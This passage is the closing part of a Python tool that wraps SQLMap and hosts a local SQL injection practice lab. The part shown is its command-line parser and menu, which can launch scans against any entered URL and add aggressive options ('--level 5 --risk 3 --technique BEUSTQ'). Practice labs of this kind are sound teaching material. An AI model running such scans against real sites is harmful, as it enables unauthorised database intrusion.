        self.lab.set_waf_mode(not self.lab.waf_mode)
        if self.console:
            status = "ENABLED" if self.lab.waf_mode else "DISABLED"
            self.console.print(f"[green]WAF mode: {status}[/green]")


# ============================================================
# COMMAND LINE INTERFACE
# ============================================================

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Advanced SQLMap Scanner & Learning Lab - DSTERMINAL Enterprise Edition v4.0',
        epilog='Example: python sqlmap_advanced.py -u http://testphp.vulnweb.com/artists.php?artist=1'
    )
    parser.add_argument('-u', '--url', help='Target URL (with http:// or https://)')
    parser.add_argument('--lab', action='store_true', help='Start the Advanced SQL Injection Learning Lab')
    parser.add_argument('--lab-port', type=int, default=8080, help='Port for the lab server (default: 8080)')
    parser.add_argument('--no-browser', action='store_true', help="Don't open browser automatically")
    parser.add_argument('--install', action='store_true', help='Install SQLMap and exit')
    parser.add_argument('--secure', action='store_true', help='Start lab in secure mode')
    parser.add_argument('--waf', action='store_true', help='Start lab with WAF enabled')
    parser.add_argument('--reset', action='store_true', help='Reset the lab database')
    parser.add_argument('--quiet', action='store_true', help='Minimal output')
    parser.add_argument('--pdf', action='store_true', help='Generate PDF notes only')
    parser.add_argument('--scan', help='Run SQLMap scan on URL (with options)')
    parser.add_argument('--advanced', action='store_true', help='Use advanced scanning options')
    parser.add_argument('--status', action='store_true', help='Show lab status')
    parser.add_argument('--techniques', action='store_true', help='Show all SQL injection techniques')
    
    args = parser.parse_args()
    
    scanner = EnhancedSQLMapScanner(verbose=not args.quiet)
    
    if args.pdf:
        scanner.cmd_advanced_pdf(None)
        return
    
    if args.install:
        scanner.install_sqlmap()
        return
    
    if args.reset:
        scanner.lab.reset_database()
        return
    
    if args.secure:
        scanner.lab.set_secure_mode(True)
    
    if args.waf:
        scanner.lab.set_waf_mode(True)
    
    if args.status:
        scanner.cmd_advanced_status(None)
        return
    
    if args.techniques:
        scanner.cmd_advanced_techniques(None)
        return
    
    if args.lab:
        scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
        try:
            while scanner.lab.running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            scanner.stop_lab()
        return
    
    if args.url:
        scan_options = args.scan or ""
        if args.advanced:
            scan_options += " --level 5 --risk 3 --threads 10 --time-sec 10 --technique BEUSTQ"
        scanner.scan(args.url, scan_options)
    else:
        if RICH_AVAILABLE and scanner.console:
            scanner.console.print("\n[bold cyan]DSTERMINAL Advanced SQL Injection Suite v4.0[/bold cyan]")
            scanner.console.print("[1] Start Advanced SQL Injection Learning Lab")
            scanner.console.print("[2] Start Lab with WAF Enabled")
            scanner.console.print("[3] Start Lab with Secure Mode Enabled")
            scanner.console.print("[4] Reset Lab Database")
            scanner.console.print("[5] Generate PDF Notes")
            scanner.console.print("[6] Install SQLMap")
            scanner.console.print("[7] Run SQLMap Scan (Advanced)")
            scanner.console.print("[8] Show Lab Status")
            scanner.console.print("[9] View SQL Injection Techniques")
            scanner.console.print("[10] Exit")
            
            choice = scanner.console.input("\n[bold green]Select option (1-10): [/]").strip()
            
            if choice == '1':
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '2':
                scanner.lab.set_waf_mode(True)
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '3':
                scanner.lab.set_secure_mode(True)
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '4':
                scanner.lab.reset_database()
            elif choice == '5':
                scanner.cmd_advanced_pdf(None)
            elif choice == '6':
                scanner.install_sqlmap()
            elif choice == '7':
                url = scanner.console.input("Target URL: ").strip()
                options = scanner.console.input("Extra options (e.g., --level 5 --risk 3): ").strip()
                scanner.scan(url, options)
            elif choice == '8':
                scanner.cmd_advanced_status(None)
            elif choice == '9':
                scanner.cmd_advanced_techniques(None)
            elif choice == '10':
                scanner.console.print("\nGoodbye!")
            else:
                scanner.console.print("\nInvalid option. Please select 1-10.")
        else:
            print("\nDSTERMINAL Advanced SQL Injection Suite v4.0")
            print("="*60)
            print("[1] Start Advanced SQL Injection Learning Lab")
            print("[2] Start Lab with WAF Enabled")
            print("[3] Start Lab with Secure Mode Enabled")
            print("[4] Reset Lab Database")
            print("[5] Generate PDF Notes")
            print("[6] Install SQLMap")
            print("[7] Run SQLMap Scan (Advanced)")
            print("[8] Show Lab Status")
            print("[9] View SQL Injection Techniques")
            print("[10] Exit")
            print("="*60)
            
            choice = input("\nSelect option (1-10): ").strip()
            
            if choice == '1':
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '2':
                scanner.lab.set_waf_mode(True)
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '3':
                scanner.lab.set_secure_mode(True)
                scanner.start_lab(port=args.lab_port, open_browser=not args.no_browser)
                try:
                    while scanner.lab.running:
                        time.sleep(0.5)
                except KeyboardInterrupt:
                    scanner.stop_lab()
            elif choice == '4':
                scanner.lab.reset_database()
            elif choice == '5':
                scanner.cmd_advanced_pdf(None)
            elif choice == '6':
                scanner.install_sqlmap()
            elif choice == '7':
                url = input("Target URL: ").strip()
                options = input("Extra options: ").strip()
                scanner.scan(url, options)
            elif choice == '8':
                scanner.cmd_advanced_status(None)
            elif choice == '9':
                scanner.cmd_advanced_techniques(None)
            elif choice == '10':
                print("\nGoodbye!")
            else:
                print("\nInvalid option. Please select 1-10.")


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    main()